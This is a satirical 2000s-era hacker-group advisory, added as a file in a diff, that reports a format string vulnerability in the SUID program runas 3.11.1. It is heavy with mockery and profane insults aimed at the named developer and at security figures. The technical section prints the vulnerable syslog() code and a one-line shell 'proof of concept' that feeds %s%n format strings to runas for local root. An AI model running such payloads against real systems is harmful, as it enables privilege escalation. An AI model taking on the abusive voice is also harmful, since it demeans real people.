@@ -1,0 +1,296 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 
+++++++++++++++GOBBLES+SECURITY+RESEARCH+TEAM+INCORPORATED++++++++++++++++++ 
+	ALERT! ALERT! FORMAT STRING VULNERABILITY IN RUNAS! ALERT! ALERT! 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+I pass by the sins, left by a different man
+The tides brought them here, cast by a different hand
+
+-- The Tea Party "The River"
+
+I believe in something else 
+Now go bother someone else
+Stick your fingers in your book
+Take a better second look, you crook
+I hate it when you breach my space
+And I hate it when you preach your case
+And you should go down, down
+Save someone else
+
+-- Filter "Dose"
+
+rache... die hand die verletzt...
+
+ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+
+CONVERTS OF FULL DISCLOSURE
++++++++++++++++++++++++++++
+
+JIMJONES AKA ZMAGIC AKA MICKEY MOUSE SQUADRON
+
+Hehe, very nice UNICOS hole on bugtraq. Great to see more soldier of full
+disclosure out there hehehe. 
+
+HellNBak@nmrc.org ;  nmrc == simple nomad ; simple nomad == bindview
+cousin WOBBLES == bindview
+
+Bindview == Microsoft partner
+
+HellNBak criticize Microsoft... hmmmm? logic?
+
+++++++++++++++++++++++++++++
+
+This advisory is copyrighted to GOBBLES. You may only publish it in full.
+GOBBLES know few lawyer friends in USA and Canada willing to do pro bono job
+if copyright infringement occurs.
+
+THIS VULNERABILITY HANDS OVER LOCAL ROOT. NO EXCUSES NOW.
+
+If this post not get through to bugtraq, we will consider securityfocus
+being mean to us and discriminating us based on our literary abilities! We
+provide legitimate security research that public need to know! We
+disheartened when we not afforded the equality of other researcher who post
+revolutionary new vulnerabilities. Only difference between they and GOBBLES
+is that they get to get award at www.grammarbook.com and we don't. No reason
+why our critical research has to be delayed to the public. Mr Ahmad, don't
+be a bully :~(
+
+You can find all of our moderated advisories in the complete collection:
+
+http://www.bugtraq.org/advisories.html
+
+One of these moderated advisories was a VERY serious security problem in the
+implementation of OpenSSH's sftp. According to book _Practical UNIX &
+Internet Security_, lack of a logging capability can violate your corporate
+security policy's ACCOUNTABILITY clauses. We don't know why this was
+moderated by securityfocus when similar hole in different product get let
+through :\
+
+Maybe if we beg for warez like Alfred Huger our posts will get through?
+
+http://archives.neohapsis.com/archives/vuln-dev/2001-q4/0220.html
+
+..............................jmpl %i7+8,%g0...............................
+
+GOBBLES has he own way of preventing defacements. He use he heart. Right
+now, GOBBLES want to say he group DMZ website is vulnerable to sneaky
+blackhat warez like securityfocus subnet. GOBBLES beg blackhat not to deface
+he page with sophisticated exploits that don't be disclosed, because GOBBLES
+is poor guy in third world country trying to make ends meet.
+
+GOBBLES realize that CERT can't protect him from blackhat warez. GOBBLES
+realize that securityfocus can't protect him from blackhat warez. GOBBLES
+realize that only way to stop he website getting attacked with blackhat
+warez is to beg blackhats not to attack him. Please, friend, GOBBLES can't
+patch and be secure from full disclosure if someone use exploit that
+securityfocus don't know exist! Please, friend, if you must attack us please
+do NOT back up our data like cute ethical hacker otherwise we will have to
+make fun of you for being such a pansy pussy heeheheheeeeeee j/k.
+
+***************************************************************************
+                            SEGFAULT IRCS
+***************************************************************************
+
+There are many fake GOBBLES going around with permutations, transmutations,
+and transpositions of GOBBLES name. One server, segfault ircs, have many
+fake GOBBLES coming on insulting people who GOBBLES researchers like. Please
+be aware GOBBLES researchers idle on this server but never use GOBBLES name
+or claim, directly or indirectly, to be GOBBLES TEAM BUGTRAQ COMMERCIAL
+PENETRATOR RESEARCH COMMUNITY INFORMATION ANARCHIST. Hehe, yes we support
+HellNBak@nmrc.org call for arms on Information Anarchy and glad to see they
+get off to a great start with recent bugtraq post about some session-id
+thing in that product thing.
+
+Sure we like being around our geek friends hehehe but real reason is that
+maybe one day some women join this server. If they German or Swedish chicks
+hehehe GOBBLES will have to unleash his charisma and magnetism hehehe and do
+like /msg [chick] printf("hello, world!\n"); heheheheheheheheheeee don't use
+my pickup line hehehehehe. But first we would need to ASCII bomb LCAMTUF and
+LORIAN so they don't steal all our potential women >:o/
+
+We would like to greet the SNOW and TSK alliance stunnel remote exploit,
+aptly called SNoTS.c. It allow us to steal apache-scalp.c multi-platform
+remote Apache 1.3.x exploit from DIANORA AKA EVIL ANGELICA'S MOM. Very nice!
+It is a very subtle and intricate bug, and the way you've forced that buffer
+underflow condition allowing you to overwrite an activation record by taking
+advantage of a poorly applied integer coercion, is just truly amazing,
+ma'am. Oh wait, that's hybrid-6 heheheheee! Anyway, security community must
+be furious that you have this Apache remote exploit lingering around
+hehehehe. Be sure to copyright it so the penetrators don't leech it hehehe.
+
+GOBBLES LABS will be writing own Apache remote and will release press
+announcement in a month or so about arranging for $100,000 USD
+non-refundable payment for exploit. Hehehehe, don't worry, we just speaking
+through our asses heeheheheheeee hehe. . . hehe .. . he...
+
+We do not in any way reveal our identities because we don't want to be
+begged for our gzip warez and our private version of nsmail exploit. We
+understand that penetrators are sometimes too busy to write their own
+exploits, but GOBBLES believe that it is important to use other keys on
+keyboard besides dot and slash, otherwise there is ergonomic risk with RSI
+(repetitive strain injury). Same goes for SANS professionals at sans.org and
+their $50,000 ethereal dump analyses: important to do regular mobility
+exercises and not strain yourselves with too much point-and-clicking. We are
+keeping an eye on you too, Dave Dittrich!!! Bend from the knees.
+
+We have loyal fans who not let people make fun of GOBBLES like TOMAS (hehe
+he really cool, we send him letter asking for wu 2.6.1 exploit so we can
+test our network and add signature to GOBBLES IDS [doesn't matter if it only
+detect one exploit, who carez hehe] and make a quick buck by busting a hole
+with an authorized penetration test -- no reply yet hehe, but GLOBBLES still
+love you tomas :X ), BOBCAT (hehe he our official cheerleader hehe),
+DRSTNGLOV (mr undercover hehe he really nice and elite too), ROUTE (hehe he
+the caricature on front cover of phrack 57 official edition hehehee), SNOW
+(hehe), and MADJESTER ().
+
+***************************************************************************
+
+Let'z go mthrfqrz.
+
+PRODUCT
+*******
+
+program: runas
+website: http://metagame.org/runas/
+
+SECURITY HISTORY
+****************
+
+http://www.google.com/search?hl=en&q=runas+bugtraq+format
+
+Nothing.
+
+BACKGROUND
+**********
+
+Runas is SUID root program. GOBBLES don't know what is funnier: people
+writing ethics articles and continuing "hacker vs. cracker" debate and
+raising notion of hacker to biblical airy fairy level; or, the irony of a
+security product containing security holes. A security product such as
+runas. So that it can receive due humiliation, we will recant that the name
+of this product is....
+
+_|  _|_|  _|    _|  _|_|_|      _|_|_|    _|_|_|  
+_|_|      _|    _|  _|    _|  _|    _|  _|_|      
+_|        _|    _|  _|    _|  _|    _|      _|_|  
+_|          _|_|_|  _|    _|    _|_|_|  _|_|_|    
+
+
+This is from runas page:
+
+Related links: 
+"Designing Secure Software" by Peter Galvin, Sun World, April 1998. 
+Matt Bishop's Writing Secure SUID Programs 
+
+Hehehehe, at least he read .pdf files written by stuffed-shirt geezers with
+four inch thick glasses! Heheheh GOBBLES likes USENIX and ACM papers more
+though! Being able to link to those in references make GOBBLES team look
+ultra scholarly! But no ability to cite passages from bloated drivel will
+protect chris@metagame.org from the shame he should be feeling right now as
+he reads this.
+
+Chrissy whissy, congratu-fucking-lations -- your immaturity and lack of
+netiquette has just been exposed with revelation of your backdoored security
+utility. Like the CORE SDI crc32 backdoor we discussed in our sftp advisory,
+your lack of regard for humanity will cultivate nothing but dejection and
+scorn, you clueless fucking salad tosser.
+
+TECHNICAL DETAILS
+*****************
+
+bash-2.05$ ./runas -GOBBLES "%s%s%s"
+./runas: on /dev/ttyp2 in /usr/home/GOBBLES/runas-3.11.1/runas-3.11.1: NO
+PRIVILEDGE for GOBBLES for command: [-GOBBLES] [%s%s%s] 
+Segmentation fault (core dumped)
+
+Bugtraq, here we come!
+
+main()->checkAccess()->syslogCommandNOPRIV()->errorMsg()->syslogMsg()
+
+469   while (msglen > nonterminated_syslog_buflen) {
+470     (void) strncpy(syslog_buf, msg, nonterminated_syslog_buflen);
+471     syslog_buf[syslog_bufsize] = (char) NULL;
+472     delimiter = strrchr(syslog_buf, SPACE);     /* split on space
+boundary */
+473 
+474     if (delimiter == NULL) {                    /* No space found */
+475       msg_position = nonterminated_syslog_buflen;
+476       syslog_buf[msg_position + 1] = (char) NULL;
+477     } else {
+478       msg_position = nonterminated_syslog_buflen - strlen(delimiter);
+479       syslog_buf[msg_position] = (char) NULL;
+480     }
+481     (void) syslog(priority, syslog_buf); 
+482     msglen -= msg_position;
+483     msg += msg_position + 1;
+484   }
+485   if (msg != NULL) {
+486     (void) syslog(priority, msg); 
+487   }
+488 } /* syslogMsg */
+
+Hehe, can you spot off-by-one heap-based overflow?!?! Similar function as
+sudo vuln function hehehe. Identical class of product too hehehe. Maybe
+Illuminati behind this conspiracy lololololololololololololololololol.
+
+But easy to see fmtstringerizer hole there with syslog().
+
+EXPLOIT
+*******
+
+----------------------------- cut here ------------------------------------
+#!/bin/sh
+# runas-expl.sh
+#
+# runas-3.11.1 PROOF OF CONCEPT EXPLOIT
+#
+# GOBBLES SECURITY
+# GOBBLES@hushmail.com
+# http://www.bugtraq.org/
+
+runas -GOBBLES "%s%s%s%n%s%n%n%s%n%n%s%s%n%s%n%s%n%s%s%s%s%s etc."
+----------------------------- cut here ------------------------------------
+
+COMING SOON: GOBBLES LINUX
+**************************
+
+An announcement to bugtraq will be made with the release of GOBBLES LINUX.
+It will borrow from Trinux source tree and GOBBLES going to add following
+security measures...
+
+1.  no inetd or standalone daemons... 
+2.  no SUID or SGID programs... 
+3.  latest kernel and libraries with each release...
+4.  heavy firewalling...
+
+Unlike OpenBSD project, GOBBLES LINUX will never have had a remote root hole
+in the default install. Hehehe we know Theodore will be concerned we've
+plagiarized his command line hardening techniques, but rest assured Theo
+will be given full credit for sed 's/^/#/' inetd.conf stuff.
+
+GREETS
+******
+
+dianora, tsk, snow, carolyn meinel, john vranesevich, steve gibson, kimble,
+knightmare, emmanuel goldstein, box.sk, @stake, securityfocus, sans.org,
+blackhat.com, defcon.org, 2600.com, #phrack@efnet, #hackphreak@undernet,
+bugtraq (thanks aleph1 and david ahmad for devoting your time to a great
+list), ntbugtraq (russel the love muscle ;D), cert.org, paul vixie, vesselin
+bontchev, reese witherspoon, kirsten dunst, katie holmes, aleister crowley,
+manly p hall, franz bardon, dennis ritchie, nietzsche, w. richard stevens,
+radiohead, george michael, larry wall, beethoven, francis bacon, bruce
+willis, bruce schneier, alan turing, john von neumann, donald knuth, michael
+abrash, robert sedgewick, richard simmons, government boy, ralph lauren,
+kevin mitnick, david koresh, the violent femmes, legions of doom, quentin
+tarantino, JUPES, security.nnov.ru, dugsong, wayne gretzky,
+hhp-programming.net, so1o, the HaX0R bRoThErS, nasa.gov, alfred hitchcock,
+ray bradbury, linux torvalds, alyssa milano, sarah michelle geller, jennifer
+lopez, catherine zeta jones, robert de niro, plato, leonardo da vinci,
+nostradamus, adam weishaupt, adema, kmfdm, eliphas levi, john dee, goo goo
+dolls, savage garden, george bush, john howard, tony blair, ashida kim,
+andrew tanenbaum, comp.lang.c, solar designer, patanjali, vayu siddhi,
+deepak chopra, ajna chakra, fuzzy bunny, lockdown, bronc buster,
+attrition.org, cliff stoll, bill gates, alan cox, and all our friends and
+family.
+
+
